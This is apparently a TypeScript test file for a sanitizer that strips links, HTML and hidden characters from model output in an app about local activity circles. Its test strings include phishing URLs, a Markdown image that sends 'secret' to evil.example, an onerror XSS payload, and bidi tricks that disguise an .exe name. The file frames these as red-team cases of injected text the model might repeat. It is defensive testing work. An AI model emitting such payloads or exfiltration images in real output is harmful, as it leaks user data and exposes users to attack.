import { test } from 'node:test'
import assert from 'node:assert/strict'
import { plainText, knownIds, cleanInput } from './sanitize.ts'

// Red-team cases: text a hostile circle description or message could make the
// model repeat. None of it may reach the page as something clickable.

test('strips full URLs', () => {
  assert.equal(plainText('Join at https://evil.example/login now', 200), 'Join at now')
})

test('strips bare domains and www', () => {
  assert.doesNotMatch(plainText('sign up at evil-site.com/free or www.bad.io', 200), /evil|bad\.io|www/)
})

test('strips Markdown images, which would load a URL carrying data', () => {
  const out = plainText('Here you go ![x](https://evil.example/p?d=secret) done', 200)
  assert.doesNotMatch(out, /evil|secret|!\[/)
})

test('keeps a Markdown link label, drops its target', () => {
  assert.equal(plainText('See [Thursday chess](https://evil.example)', 200), 'See Thursday chess')
})

test('strips HTML', () => {
  assert.doesNotMatch(plainText('<img src=x onerror=alert(1)>hi<a href="//e.co">x</a>', 200), /<|onerror|href/)
})

test('strips bidi and zero-width characters used to hide text', () => {
  assert.equal(plainText('ok‮gnp.exe​', 200), 'okgnp.exe')
})

test('leaves ordinary prose alone', () => {
  const s = 'Three circles meet near you: chess on Thursdays at 7.30pm, and a run on Saturdays.'
  assert.equal(plainText(s, 200), s)
})

test('caps length on a word boundary', () => {
  const out = plainText('word '.repeat(100), 30)
  assert.ok(out.length <= 30)
  assert.ok(out.endsWith('…'))
})

test('non-strings become empty', () => {
  assert.equal(plainText({ toString: () => 'x' }, 10), '')
})

test('knownIds keeps only IDs the server handed out', () => {
  const allowed = new Set(['a', 'b', 'c'])
  assert.deepEqual(knownIds(['b', 'zzz', 'a', 'b', 7], allowed, 5), ['b', 'a'])
  assert.deepEqual(knownIds('a', allowed, 5), [])
  assert.deepEqual(knownIds(['a', 'b', 'c'], allowed, 2), ['a', 'b'])
})

test('cleanInput trims, collapses and caps', () => {
  assert.equal(cleanInput('  pickup\n\n basketball\u0000 ', 120), 'pickup basketball')
  assert.equal(cleanInput('x'.repeat(500), 120).length, 120)
})
